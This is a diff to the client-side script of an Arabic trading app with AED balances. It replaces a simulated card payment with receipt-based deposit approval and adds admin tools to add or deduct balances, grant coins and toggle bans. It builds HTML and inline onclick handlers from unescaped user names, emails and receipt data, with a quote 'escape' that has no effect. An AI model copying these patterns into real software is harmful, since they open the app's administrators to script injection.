 function updateDepCalc(){
@@ -1264,25 +1391,7 @@ function selectPayMethod(el,method){
   document.querySelectorAll('.dep-method').forEach(e=>{e.classList.remove('selected');});
   el.classList.add('selected');
 }
-async function processStripePayment(){
-  // Stripe will be integrated here with your publishable key
-  // For now, simulate payment success
-  document.getElementById('payNowBtn').textContent='جارٍ المعالجة...';
-  document.getElementById('payNowBtn').disabled=true;
-  setTimeout(async()=>{
-    const bonus=S.depositAmount>=1000?S.depositAmount*0.3:S.depositAmount>=500?S.depositAmount*0.2:S.depositAmount>=100?S.depositAmount*0.1:0;
-    const total=S.depositAmount+bonus;
-    S.balance+=total; S.totalDeposited+=S.depositAmount;
-    document.getElementById('successAmtDisp').textContent='AED '+total.toLocaleString('en',{minimumFractionDigits:2});
-    updateBal();
-    ['depStep1','depStep2','depStep3','depStep4'].forEach(id=>{const e=document.getElementById(id);e.classList.toggle('active',id==='depStep4');});
-    document.getElementById('payNowBtn').textContent='💳 ادفع الآن';
-    document.getElementById('payNowBtn').disabled=false;
-    await saveUserData();
-    updateAdminStats();
-    toast(`✅ تم إيداع AED ${total.toFixed(2)} بنجاح!`,'win');
-  },2000);
-}
+
 
 // ===== WITHDRAW =====
 function selWD(el){document.querySelectorAll('#wdMethods>div').forEach(d=>{d.style.borderColor='var(--border)';d.style.background='var(--bg-card)';d.style.color='';});el.style.borderColor='var(--red)';el.style.background='rgba(255,23,68,0.08)';}
@@ -1407,6 +1516,32 @@ function claimDaily(i){
 function claimRw(r){S.coins+=r;updateCoinsDisplay();saveUserData();toast(`🎉 استلمت ${r} عملة!`,'win');}
 
 // ===== ADMIN =====
+// ===== ADMIN FUNCTIONS =====
+let allUsersData = [];
+let allDepReqs = [];
+let currentDepFilter = 'pending';
+let currentDepDocId = null;
+let currentDepUid = null;
+let currentDepAmt = 0;
+
+function switchAdminTab(n){
+  [1,2,3].forEach(i=>{
+    document.getElementById('adminTab'+i).style.display = i===n?'block':'none';
+    const tab = document.getElementById('atab'+i);
+    tab.style.borderBottomColor = i===n?'var(--red)':'transparent';
+    tab.style.color = i===n?'white':'var(--text-secondary)';
+  });
+  if(n===2) loadAdminUsers();
+  if(n===3) loadDepositRequests();
+}
+
+function filterAdminUsers(q){
+  const filtered = allUsersData.filter(u =>
+    (u.name||'').includes(q) || (u.email||'').includes(q)
+  );
+  renderAdminUsers(filtered);
+}
+
 function updateAdminStats(){
   const tot=S.wins+S.losses;
   document.getElementById('adTotalTrades').textContent=tot;
@@ -1418,37 +1553,52 @@ function updateAdminStats(){
 }
 
 async function loadAdminUsers(){
+  document.getElementById('adminUsersList').innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary);">جارٍ التحميل...</div>';
   try {
     const snap = await db.collection('users').get();
     document.getElementById('adTotalUsers').textContent = snap.size;
-    let html = '';
-    snap.forEach(doc => {
-      const d = doc.data();
-      html += `<div class="admin-user-row">
-        <div class="admin-user-top">
-          <div style="width:36px;height:36px;border-radius:50%;background:rgba(41,121,255,0.2);display:flex;align-items:center;justify-content:center;font-size:16px;">👤</div>
-          <div style="flex:1;">
-            <div style="font-size:13px;font-weight:700;">${d.name||'مستخدم'}</div>
-            <div style="font-size:11px;color:var(--text-secondary);">${d.email||''}</div>
-          </div>
-          <div style="font-size:13px;font-weight:700;color:var(--green);">AED ${(d.balance||0).toLocaleString('en',{minimumFractionDigits:2})}</div>
-        </div>
-        <div style="font-size:11px;color:var(--text-secondary);margin-bottom:10px;display:flex;gap:16px;">
-          <span>✅ ${d.wins||0} ربح</span>
-          <span>❌ ${d.losses||0} خسارة</span>
-          <span>💰 ${d.totalDeposited||0} إيداع</span>
-        </div>
-        <div class="admin-user-btns">
-          <button class="admin-user-btn add" onclick="adminBal('${doc.id}','${d.name||d.email}',${d.balance||0},'add')">+ إضافة رصيد</button>
-          <button class="admin-user-btn sub" onclick="adminBal('${doc.id}','${d.name||d.email}',${d.balance||0},'sub')">− خصم رصيد</button>
-          <button class="admin-user-btn ban" onclick="adminBanUser('${doc.id}','${d.name||d.email}')">🚫 حظر</button>
-        </div>
-      </div>`;
-    });
-    document.getElementById('adminUsersList').innerHTML = html || '<div style="text-align:center;padding:20px;color:var(--text-secondary);">لا يوجد مستخدمون بعد</div>';
+    allUsersData = [];
+    snap.forEach(doc => allUsersData.push({id:doc.id, ...doc.data()}));
+    renderAdminUsers(allUsersData);
   } catch(e) {
-    document.getElementById('adminUsersList').innerHTML = '<div style="padding:16px;color:var(--text-secondary);font-size:13px;">تأكد من إعدادات Firestore</div>';
+    document.getElementById('adminUsersList').innerHTML='<div style="padding:16px;color:var(--red);font-size:13px;text-align:center;">خطأ في تحميل البيانات</div>';
   }
+}
+
+function renderAdminUsers(users){
+  if(!users.length){
+    document.getElementById('adminUsersList').innerHTML='<div style="text-align:center;padding:40px;color:var(--text-secondary);">لا يوجد مستخدمون</div>';
+    return;
+  }
+  let html = '';
+  users.forEach(d => {
+    html += `<div class="admin-user-row">
+      <div class="admin-user-top">
+        <div style="width:38px;height:38px;border-radius:50%;background:linear-gradient(135deg,var(--blue),var(--accent));display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:700;color:white;">${(d.name||'؟').charAt(0)}</div>
+        <div style="flex:1;">
+          <div style="font-size:13px;font-weight:700;">${d.name||'مستخدم'}</div>
+          <div style="font-size:11px;color:var(--text-secondary);">${d.email||''}</div>
+        </div>
+        <div style="text-align:left;">
+          <div style="font-size:13px;font-weight:700;color:var(--gold);">AED ${(d.balance||0).toLocaleString('en',{minimumFractionDigits:2})}</div>
+          <div style="font-size:10px;color:var(--text-secondary);">🪙 ${(d.coins||0).toLocaleString()}</div>
+        </div>
+      </div>
+      <div style="font-size:11px;color:var(--text-secondary);margin-bottom:10px;display:flex;gap:12px;flex-wrap:wrap;">
+        <span>✅ ${d.wins||0} ربح</span>
+        <span>❌ ${d.losses||0} خسارة</span>
+        <span>💰 AED ${(d.totalDeposited||0).toFixed(0)}</span>
+        ${d.banned?'<span style="color:var(--red);">🚫 محظور</span>':''}
+      </div>
+      <div class="admin-user-btns">
+        <button class="admin-user-btn add" onclick="adminBal('${d.id}','${(d.name||d.email||'').replace(/'/g,"\'")}',${d.balance||0},'add')">+ رصيد</button>
+        <button class="admin-user-btn sub" onclick="adminBal('${d.id}','${(d.name||d.email||'').replace(/'/g,"\'")}',${d.balance||0},'sub')">- خصم</button>
+        <button class="admin-user-btn ban" style="background:rgba(255,214,0,0.1);color:var(--gold);border-color:rgba(255,214,0,0.3);" onclick="adminBonus('${d.id}','${(d.name||d.email||'').replace(/'/g,"\'")}',${d.coins||0})">🎁 مكافأة</button>
+        <button class="admin-user-btn ban" onclick="adminBanUser('${d.id}','${(d.name||d.email||'').replace(/'/g,"\'")}')">🚫</button>
+      </div>
+    </div>`;
+  });
+  document.getElementById('adminUsersList').innerHTML = html;
 }
 
 function adminBal(uid, name, current, action) {
@@ -1457,7 +1607,19 @@ function adminBal(uid, name, current, action) {
   document.getElementById('adminBalUserName').textContent = name;
   document.getElementById('adminBalCurrent').textContent = 'AED '+parseFloat(current).toLocaleString('en',{minimumFractionDigits:2});
   document.getElementById('adminBalAmt').value = '';
+  document.getElementById('adminBalAmt').placeholder = action==='add'?'المبلغ المراد إضافته':'المبلغ المراد خصمه';
   document.getElementById('adminBalConfirm').style.background = action==='add'?'linear-gradient(135deg,#00b05a,#00e676)':'linear-gradient(135deg,#c0001a,#ff1744)';
+  openModal('adminBalModal');
+}
+
+function adminBonus(uid, name, currentCoins) {
+  S.adminBalUserId = uid; S.adminBalAction = 'bonus';
+  document.getElementById('adminBalTitle').textContent = '🎁 إضافة مكافأة';
+  document.getElementById('adminBalUserName').textContent = name;
+  document.getElementById('adminBalCurrent').textContent = '🪙 '+parseInt(currentCoins).toLocaleString()+' عملة';
+  document.getElementById('adminBalAmt').value = '';
+  document.getElementById('adminBalAmt').placeholder = 'عدد العملات';
+  document.getElementById('adminBalConfirm').style.background = 'linear-gradient(135deg,#e65100,var(--gold))';
   openModal('adminBalModal');
 }
 
@@ -1466,29 +1628,127 @@ async function confirmAdminBal() {
   if (!amt || amt <= 0) { toast('أدخل مبلغاً صحيحاً', 'loss'); return; }
   try {
     const ref = db.collection('users').doc(S.adminBalUserId);
-    const doc = await ref.get();
-    const cur = doc.data().balance || 0;
-    const newBal = S.adminBalAction === 'add' ? cur + amt : Math.max(0, cur - amt);
-    await ref.update({ balance: newBal });
+    const docSnap = await ref.get();
+    const d = docSnap.data();
+    if(S.adminBalAction === 'add'){
+      await ref.update({ balance: (d.balance||0) + amt });
+      toast(`✅ تم إضافة AED ${amt}`, 'win');
+    } else if(S.adminBalAction === 'sub'){
+      await ref.update({ balance: Math.max(0,(d.balance||0) - amt) });
+      toast(`✅ تم خصم AED ${amt}`, 'win');
+    } else if(S.adminBalAction === 'bonus'){
+      await ref.update({ coins: (d.coins||0) + amt });
+      toast(`🎁 تم إضافة ${amt} عملة`, 'win');
+    }
     closeModal('adminBalModal');
-    toast(S.adminBalAction==='add' ? `✅ تم إضافة AED ${amt}` : `✅ تم خصم AED ${amt}`, 'win');
     loadAdminUsers();
   } catch(e) { toast('حدث خطأ', 'loss'); }
 }
 
 async function adminBanUser(uid, name) {
-  if (!confirm(`هل تريد حظر المستخدم: ${name}؟`)) return;
   try {
-    await db.collection('users').doc(uid).update({ banned: true });
-    toast(`🚫 تم حظر ${name}`, 'win');
+    const ref = db.collection('users').doc(uid);
+    const d = (await ref.get()).data();
+    await ref.update({ banned: !d.banned });
+    toast(d.banned ? `✅ تم رفع الحظر عن ${name}` : `🚫 تم حظر ${name}`, 'win');
     loadAdminUsers();
   } catch(e) { toast('حدث خطأ', 'loss'); }
+}
+
+// ===== DEPOSIT REQUESTS =====
+async function loadDepositRequests(){
+  document.getElementById('adminDepList').innerHTML='<div style="text-align:center;padding:40px;color:var(--text-secondary);">جارٍ التحميل...</div>';
+  try {
+    const snap = await db.collection('depositRequests').orderBy('createdAt','desc').get();
+    allDepReqs = [];
+    snap.forEach(doc => allDepReqs.push({id:doc.id, ...doc.data()}));
+    // Show badge if pending
+    const pending = allDepReqs.filter(r=>r.status==='pending').length;
+    const badge = document.getElementById('depBadge');
+    if(pending>0){ badge.textContent=pending; badge.style.display='flex'; }
+    else { badge.style.display='none'; }
+    renderDepReqs(currentDepFilter);
+  } catch(e){
+    document.getElementById('adminDepList').innerHTML='<div style="padding:16px;color:var(--red);font-size:13px;text-align:center;">خطأ في التحميل</div>';
+  }
+}
+
+function filterDepReqs(status){
+  currentDepFilter = status;
+  ['pending','approved','rejected'].forEach(s=>{
+    const btn = document.getElementById('depFilter'+s.charAt(0).toUpperCase()+s.slice(1));
+    const isActive = s===status;
+    btn.style.background = isActive?'rgba(255,214,0,0.15)':'var(--bg-card)';
+    btn.style.borderColor = isActive?'rgba(255,214,0,0.4)':'var(--border)';
+    btn.style.color = isActive?'var(--gold)':'var(--text-secondary)';
+  });
+  renderDepReqs(status);
+}
+
+function renderDepReqs(status){
+  const filtered = allDepReqs.filter(r=>r.status===status);
+  if(!filtered.length){
+    document.getElementById('adminDepList').innerHTML=`<div style="text-align:center;padding:40px;color:var(--text-secondary);">لا توجد طلبات ${status==='pending'?'قيد الانتظار':status==='approved'?'مقبولة':'مرفوضة'}</div>`;
+    return;
+  }
+  let html='';
+  filtered.forEach(r=>{
+    const date = r.createdAt ? new Date(r.createdAt.seconds*1000).toLocaleString('ar') : '';
+    html+=`<div style="background:var(--bg-card);border:1px solid var(--border);border-radius:12px;padding:14px;margin:0 16px 10px;">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;">
+        <div>
+          <div style="font-size:13px;font-weight:700;">${r.name||'مستخدم'}</div>
+          <div style="font-size:11px;color:var(--text-secondary);">${r.email||''}</div>
+          <div style="font-size:10px;color:var(--text-muted);">${date}</div>
+        </div>
+        <div style="text-align:left;">
+          <div style="font-size:18px;font-weight:900;color:var(--gold);">AED ${(r.amount||0).toLocaleString('en',{minimumFractionDigits:2})}</div>
+          <div style="font-size:11px;color:${r.status==='pending'?'var(--gold)':r.status==='approved'?'var(--green)':'var(--red)'};">${r.status==='pending'?'⏳ انتظار':r.status==='approved'?'✅ مقبول':'❌ مرفوض'}</div>
+        </div>
+      </div>
+      <button onclick="viewReceipt('${r.id}','${(r.name||'').replace(/'/g,"\'")}','${r.email||''}',${r.amount||0},'${r.uid||''}',\`${r.receipt||''}\`)" style="width:100%;padding:10px;background:rgba(41,121,255,0.1);border:1px solid rgba(41,121,255,0.3);border-radius:8px;color:var(--blue-light);font-size:13px;font-weight:700;font-family:'Cairo',sans-serif;cursor:pointer;">📸 عرض الإيصال${r.status==='pending'?' والموافقة':''}</button>
+    </div>`;
+  });
+  document.getElementById('adminDepList').innerHTML=html;
+}
+
+function viewReceipt(docId, name, email, amt, uid, imgData){
+  currentDepDocId=docId; currentDepUid=uid; currentDepAmt=amt;
+  document.getElementById('receiptModalInfo').innerHTML=`
+    <div style="display:flex;justify-content:space-between;margin-bottom:4px;"><span style="color:var(--text-secondary);">الاسم</span><span style="font-weight:700;">${name}</span></div>
+    <div style="display:flex;justify-content:space-between;margin-bottom:4px;"><span style="color:var(--text-secondary);">البريد</span><span style="font-size:12px;">${email}</span></div>
+    <div style="display:flex;justify-content:space-between;"><span style="color:var(--text-secondary);">المبلغ</span><span style="font-weight:900;color:var(--gold);">AED ${parseFloat(amt).toLocaleString('en',{minimumFractionDigits:2})}</span></div>`;
+  document.getElementById('receiptModalImg').src = imgData || '';
+  openModal('receiptModal');
+}
+
+async function approveDeposit(){
+  try {
+    // Add balance to user
+    const userRef = db.collection('users').doc(currentDepUid);
+    const userDoc = await userRef.get();
+    const cur = userDoc.exists ? (userDoc.data().balance||0) : 0;
+    await userRef.update({ balance: cur + currentDepAmt, totalDeposited: (userDoc.data().totalDeposited||0)+currentDepAmt });
+    // Update request status
+    await db.collection('depositRequests').doc(currentDepDocId).update({ status:'approved', approvedAt: firebase.firestore.FieldValue.serverTimestamp() });
+    closeModal('receiptModal');
+    toast('✅ تم قبول الإيداع وإضافة الرصيد!','win');
+    loadDepositRequests();
+  } catch(e){ toast('حدث خطأ','loss'); }
+}
+
+async function rejectDeposit(){
+  try {
+    await db.collection('depositRequests').doc(currentDepDocId).update({ status:'rejected', rejectedAt: firebase.firestore.FieldValue.serverTimestamp() });
+    closeModal('receiptModal');
+    toast('❌ تم رفض طلب الإيداع','loss');
+    loadDepositRequests();
+  } catch(e){ toast('حدث خطأ','loss'); }
 }
 
 function sendAdminNotif(){
   const txt=document.getElementById('adminNotif').value.trim();
   if(!txt){toast('اكتب الإشعار أولاً','loss');return;}
-  // Save notification to Firestore for all users
   db.collection('notifications').add({
     message: txt,
     createdAt: firebase.firestore.FieldValue.serverTimestamp(),
@@ -1529,8 +1789,6 @@ document.querySelector('.btn-sched').onclick = openSchedModal;
 document.querySelectorAll('.nav-item')[2].onclick = function(){setNav(this);showScreen('storeScreen');document.getElementById('storeCoins').textContent=S.coins.toLocaleString();};
 document.querySelectorAll('.nav-item')[3].onclick = function(){setNav(this);showScreen('rewardsScreen');renderRewards();};
 document.querySelector('.asset-selector').onclick = function(){renderAssets();openPanel('assetsPanel');};
-document.querySelectorAll('.nav-item')[1].onclick = function(){setNav(this);renderTrades();openPanel('tradesPanel');};
-document.querySelector('.account-btn').onclick = function(){updateAccStats();updateBal();openPanel('accountPanel');};
 </script>
 </body>
 </html>
